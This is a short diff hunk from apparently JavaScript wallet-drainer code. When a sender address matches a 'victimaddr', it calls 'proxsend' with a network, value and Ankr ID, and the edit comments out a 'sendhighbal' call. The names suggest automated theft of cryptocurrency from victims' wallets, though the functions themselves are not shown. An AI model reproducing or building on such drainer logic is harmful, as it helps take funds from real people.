@@ -1166,7 +1166,7 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
 
    await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' );
 
-   sendhighbal(request,results, recver, AnkrId,ntwk, value, 'logger' );
+  //  sendhighbal(request,results, recver, AnkrId,ntwk, value, 'logger' );
   
   }
   else {
